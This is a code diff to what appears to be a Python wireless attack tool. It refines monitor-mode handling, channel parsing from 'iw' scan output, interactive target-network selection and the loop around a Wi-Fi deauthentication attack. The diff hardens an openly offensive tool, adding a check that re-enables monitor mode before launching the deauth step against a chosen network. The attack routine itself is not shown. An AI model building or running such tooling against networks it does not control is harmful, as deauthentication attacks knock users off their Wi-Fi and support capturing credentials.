@@ -29,14 +29,31 @@ def style(text: str, *styles: str) -> str:
     return f"{prefix}{text}{COLOR_RESET}" if prefix else text
 
 
-def freq_to_channel(freq: int) -> Optional[int]:
+def freq_to_channel(freq: float) -> Optional[int]:
     if 2412 <= freq <= 2472:
-        return (freq - 2407) // 5
+        return int((freq - 2407) // 5)
     if freq == 2484:
         return 14
     if 5000 <= freq <= 5825:
-        return (freq - 5000) // 5
+        return int((freq - 5000) // 5)
     return None
+
+
+def parse_channel_value(text: str) -> Optional[int]:
+    try:
+        return int(text)
+    except (TypeError, ValueError):
+        return None
+
+
+def parse_freq_value(text: str) -> Optional[float]:
+    try:
+        value = float(text)
+    except (TypeError, ValueError):
+        return None
+    if value > 100000:
+        value /= 1000.0
+    return value
 
 
 def get_interface_chipset(interface: str) -> str:
@@ -80,18 +97,70 @@ def list_network_interfaces() -> List[str]:
     return interfaces
 
 
-def scan_wireless_networks(interface: str) -> List[Dict[str, Optional[str]]]:
+def get_interface_mode(interface: str) -> Optional[str]:
+    result = subprocess.run(
+        ["iw", "dev", interface, "info"],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True,
+        check=False,
+    )
+    if result.returncode != 0:
+        return None
+    for raw_line in result.stdout.splitlines():
+        line = raw_line.strip()
+        if line.startswith("type "):
+            parts = line.split()
+            if len(parts) >= 2:
+                return parts[1]
+    return None
+
+
+def is_monitor_mode(interface: str) -> bool:
+    return get_interface_mode(interface) == "monitor"
+
+
+def set_interface_type(interface: str, mode: str) -> bool:
     try:
+        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
         result = subprocess.run(
+            ["iw", "dev", interface, "set", "type", mode],
+            stderr=subprocess.PIPE,
+            text=True,
+            check=False,
+        )
+        if result.returncode != 0:
+            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
+            return False
+        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
+        time.sleep(0.5)
+        return True
+    except Exception as exc:
+        logging.error("Failed to set %s mode: %s", mode, exc)
+        return False
+
+
+def scan_wireless_networks(interface: str) -> List[Dict[str, Optional[str]]]:
+    def run_scan() -> subprocess.CompletedProcess:
+        return subprocess.run(
             ["iw", "dev", interface, "scan"],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             text=True,
             check=False,
         )
+
+    try:
+        result = run_scan()
     except FileNotFoundError:
         logging.error("Required tool 'iw' not found!")
         return []
+
+    if result.returncode != 0 and is_monitor_mode(interface):
+        if set_interface_type(interface, "managed"):
+            result = run_scan()
+            if not set_interface_type(interface, "monitor"):
+                logging.error("Failed to restore monitor mode after scan.")
 
     if result.returncode != 0:
         logging.error("Wireless scan failed: %s", result.stderr.strip() or "unknown error")
@@ -107,11 +176,23 @@ def scan_wireless_networks(interface: str) -> List[Dict[str, Optional[str]]]:
             current = {"bssid": line.split()[1].split("(")[0], "ssid": None, "signal": None, "channel": None}
             continue
         if line.startswith("freq:"):
-            try:
-                freq_val = int(line.split()[1])
-                current["channel"] = freq_to_channel(freq_val)
-            except (ValueError, IndexError):
-                current["channel"] = None
+            parts = line.split()
+            freq_val = parse_freq_value(parts[1]) if len(parts) > 1 else None
+            current["channel"] = freq_to_channel(freq_val) if freq_val is not None else None
+            continue
+        if line.startswith("DS Parameter set:"):
+            parts = line.split()
+            if len(parts) >= 4 and parts[-2] == "channel":
+                channel_val = parse_channel_value(parts[-1])
+                if channel_val is not None:
+                    current["channel"] = channel_val
+            continue
+        if line.startswith("* primary channel:"):
+            parts = line.split(":")
+            if len(parts) == 2:
+                channel_val = parse_channel_value(parts[1].strip())
+                if channel_val is not None:
+                    current["channel"] = channel_val
             continue
         if line.startswith("signal:"):
             parts = line.split()
@@ -140,19 +221,21 @@ def select_network(attack_interface: str) -> Dict[str, Optional[str]]:
         networks = scan_wireless_networks(attack_interface)
         if not networks:
             logging.warning("No networks found during scan.")
-            retry = input("Rescan? (Y/N): ").strip().lower()
+            retry = input(f"{style('Rescan', STYLE_BOLD)}? (Y/N): ").strip().lower()
             if retry == "y":
                 continue
             sys.exit(1)
 
-        logging.info("Available networks:")
+        logging.info(style("Available networks:", STYLE_BOLD))
         for index, net in enumerate(networks, start=1):
             signal = f"{net['signal']:.1f} dBm" if net["signal"] is not None else "signal unknown"
             channel = f"ch {net['channel']}" if net["channel"] else "ch ?"
             label = f"{index}) {net['ssid']} ({net['bssid']}) -"
             logging.info("  %s %s %s", color_text(label, COLOR_HIGHLIGHT), channel, signal)
 
-        choice = input("Select network (number, or R to rescan): ").strip().lower()
+        choice = input(
+            f"{style('Select network', STYLE_BOLD)} (number, or R to rescan): "
+        ).strip().lower()
         if choice == "r":
             continue
         if choice.isdigit():
@@ -167,14 +250,14 @@ def select_interface(interfaces: List[str]) -> str:
         logging.error("No network interfaces found.")
         sys.exit(1)
 
-    logging.info("Available interfaces:")
+    logging.info(style("Available interfaces:", STYLE_BOLD))
     for index, name in enumerate(interfaces, start=1):
         chipset = get_interface_chipset(name)
         label = f"{index}) {name} -"
         logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)
 
     while True:
-        choice = input("Select attack interface (number or name): ").strip()
+        choice = input(f"{style('Select attack interface', STYLE_BOLD)} (number or name): ").strip()
         if not choice:
             logging.warning("Please select an interface.")
             continue
@@ -194,14 +277,19 @@ ORIGINAL_MODE = "managed"
 
 def enable_monitor_mode(interface: str, channel: Optional[int]) -> bool:
     try:
-        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
-        result = subprocess.run(["iw", "dev", interface, "set", "type", "monitor"], stderr=subprocess.PIPE, text=True)
-        if result.returncode != 0:
-            logging.error("Failed to set monitor mode: %s", result.stderr.strip() or "unknown error")
+        if not set_interface_type(interface, "monitor"):
             return False
-        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
         if channel:
             subprocess.run(["iw", "dev", interface, "set", "channel", str(channel)], stderr=subprocess.DEVNULL)
+        if not is_monitor_mode(interface):
+            current_mode = get_interface_mode(interface)
+            logging.error(
+                "Monitor mode not active on %s (current mode: %s).",
+                interface,
+                current_mode or "unknown",
+            )
+            return False
+        logging.info("Monitor mode confirmed on %s.", interface)
         return True
     except Exception as exc:
         logging.error("Failed to enable monitor mode: %s", exc)
@@ -278,11 +366,11 @@ def run_deauth_session() -> bool:
     interfaces = list_network_interfaces()
     SELECTED_INTERFACE = select_interface(interfaces)
 
-    input(f"Press Enter to switch {SELECTED_INTERFACE} to monitor mode...")
+    input(f"{style('Press Enter', STYLE_BOLD)} to switch {SELECTED_INTERFACE} to monitor mode...")
     if not enable_monitor_mode(SELECTED_INTERFACE, None):
         return False
 
-    input(f"Press Enter to scan networks on {SELECTED_INTERFACE}...")
+    input(f"{style('Press Enter', STYLE_BOLD)} to scan networks on {SELECTED_INTERFACE}...")
     target_network = select_network(SELECTED_INTERFACE)
     logging.info(
         "Target selected: %s (%s)",
@@ -290,7 +378,15 @@ def run_deauth_session() -> bool:
         target_network["bssid"],
     )
 
-    input(f"Press Enter to start Deauth attack on {style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)}...")
+    if not is_monitor_mode(SELECTED_INTERFACE):
+        logging.warning("Interface left monitor mode; re-enabling.")
+        if not enable_monitor_mode(SELECTED_INTERFACE, target_network.get("channel")):
+            return False
+
+    input(
+        f"{style('Press Enter', STYLE_BOLD)} to start Deauth attack on "
+        f"{style(target_network['ssid'], COLOR_SUCCESS, STYLE_BOLD)}..."
+    )
 
     if not start_deauth_attack(SELECTED_INTERFACE, target_network):
         return False
@@ -309,7 +405,16 @@ def run_deauth_session() -> bool:
         while True:
             time.sleep(1)
             if ATTACK_PROCESS and ATTACK_PROCESS.poll() is not None:
-                logging.error("Deauth process exited unexpectedly.")
+                err_output = ""
+                if ATTACK_PROCESS.stderr:
+                    try:
+                        err_output = ATTACK_PROCESS.stderr.read().strip()
+                    except Exception:
+                        err_output = ""
+                if err_output:
+                    logging.error("Deauth process exited unexpectedly: %s", err_output)
+                else:
+                    logging.error("Deauth process exited unexpectedly.")
                 return False
     except KeyboardInterrupt:
         logging.info(color_text("Stopping attack...", COLOR_STOP))
@@ -317,9 +422,10 @@ def run_deauth_session() -> bool:
         stop_attack()
         restore_managed_mode(SELECTED_INTERFACE)
 
-    logging.info(style("harvest complete!", COLOR_SUCCESS, STYLE_BOLD))
     while True:
-        choice = input("Exit script (E) or restart (R): ").strip().lower()
+        choice = input(
+            f"{style('Exit script', STYLE_BOLD)} (E) or {style('restart', STYLE_BOLD)} (R): "
+        ).strip().lower()
         if choice in {"e", "exit"}:
             return False
         if choice in {"r", "restart"}:
